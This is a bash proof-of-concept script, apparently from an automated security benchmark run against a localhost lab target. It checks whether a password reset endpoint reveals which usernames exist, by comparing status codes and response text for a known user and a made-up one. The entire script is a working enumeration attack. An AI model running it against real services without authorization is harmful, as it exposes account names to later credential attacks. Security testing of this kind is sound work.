#!/bin/bash
# POC: Demonstrates user enumeration via password reset endpoint by detecting response differentiation between valid and invalid usernames
# Target: ./repo
# Created: 2025-11-07T16:36:07.508Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# User Enumeration via Password Reset Endpoint POC
# This script demonstrates how an attacker can enumerate valid usernames
# by detecting response differentiation on the password reset endpoint

TARGET_URL="http://localhost:8082"
PASSWORD_RESET_ENDPOINT="/password"

echo "======================================"
echo "User Enumeration POC - Password Reset"
echo "======================================"
echo "Target: $TARGET_URL"
echo ""

# Test case 1: Valid username
echo "[*] Testing valid username: test"
echo "    Sending: GET $TARGET_URL$PASSWORD_RESET_ENDPOINT/test"
RESPONSE_VALID=$(curl -s -L -w "\n%{http_code}" "$TARGET_URL$PASSWORD_RESET_ENDPOINT/test" 2>&1)
HTTP_CODE_VALID=$(echo "$RESPONSE_VALID" | tail -n 1)
BODY_VALID=$(echo "$RESPONSE_VALID" | head -n -1)

echo "    Response Code: $HTTP_CODE_VALID"
echo "    Response Preview: ${BODY_VALID:0:300}"

# Check for indicators of valid user
if echo "$BODY_VALID" | grep -qi "password\|reset\|change.*password\|recover"; then
    echo "    [+] Valid user response detected (password reset form found)"
    VALID_USER_FOUND=1
else
    echo "    [-] No password reset form found"
    VALID_USER_FOUND=0
fi

# Check for error message
if echo "$BODY_VALID" | grep -qi "error\|not found\|does not exist"; then
    echo "    [+] Error message detected in response"
    VALID_USER_ERROR=1
else
    echo "    [-] No error message in response"
    VALID_USER_ERROR=0
fi
echo ""

# Test case 2: Invalid username
echo "[*] Testing invalid username: nonexistentuser12345xyz"
echo "    Sending: GET $TARGET_URL$PASSWORD_RESET_ENDPOINT/nonexistentuser12345xyz"
RESPONSE_INVALID=$(curl -s -L -w "\n%{http_code}" "$TARGET_URL$PASSWORD_RESET_ENDPOINT/nonexistentuser12345xyz" 2>&1)
HTTP_CODE_INVALID=$(echo "$RESPONSE_INVALID" | tail -n 1)
BODY_INVALID=$(echo "$RESPONSE_INVALID" | head -n -1)

echo "    Response Code: $HTTP_CODE_INVALID"
echo "    Response Preview: ${BODY_INVALID:0:300}"

# Check for indicators of invalid user
if echo "$BODY_INVALID" | grep -qi "password\|reset\|change.*password\|recover"; then
    echo "    [+] Invalid user response contains password reset form"
    INVALID_USER_FORM=1
else
    echo "    [-] No password reset form for invalid user"
    INVALID_USER_FORM=0
fi

# Check for error message
if echo "$BODY_INVALID" | grep -qi "error\|not found\|does not exist"; then
    echo "    [+] Error message detected for invalid user"
    INVALID_USER_ERROR=1
else
    echo "    [-] No error message for invalid user"
    INVALID_USER_ERROR=0
fi
echo ""

# Analysis
echo "[*] ANALYSIS:"
echo "    Valid user 'test':"
echo "      - HTTP Code: $HTTP_CODE_VALID"
echo "      - Has password form: $VALID_USER_FOUND"
echo "      - Has error message: $VALID_USER_ERROR"
echo ""
echo "    Invalid user 'nonexistentuser12345xyz':"
echo "      - HTTP Code: $HTTP_CODE_INVALID"
echo "      - Has password form: $INVALID_USER_FORM"
echo "      - Has error message: $INVALID_USER_ERROR"
echo ""

# Determine if vulnerable
if [[ $VALID_USER_FOUND -eq 1 && $VALID_USER_ERROR -eq 0 ]] && [[ $INVALID_USER_ERROR -eq 1 ]]; then
    echo "    [VULNERABLE] Clear differentiation between valid and invalid users!"
    echo "    - Valid user 'test': Shows password reset form (no error)"
    echo "    - Invalid user: Shows error message"
    echo "    - Allows systematic username enumeration"
    exit 0
elif [[ $HTTP_CODE_VALID != $HTTP_CODE_INVALID ]]; then
    echo "    [VULNERABLE] Different HTTP status codes for valid vs invalid users!"
    echo "    - Valid user: $HTTP_CODE_VALID"
    echo "    - Invalid user: $HTTP_CODE_INVALID"
    exit 0
elif [[ $VALID_USER_FOUND -eq 1 && $INVALID_USER_FORM -eq 0 && $INVALID_USER_ERROR -eq 1 ]]; then
    echo "    [VULNERABLE] Response differentiation confirmed!"
    exit 0
else
    echo "    [INFO] Testing response differentiation"
    if [[ "$BODY_VALID" != "$BODY_INVALID" ]]; then
        echo "    [LIKELY VULNERABLE] Responses are different between valid and invalid users"
        exit 0
    fi
fi

exit 1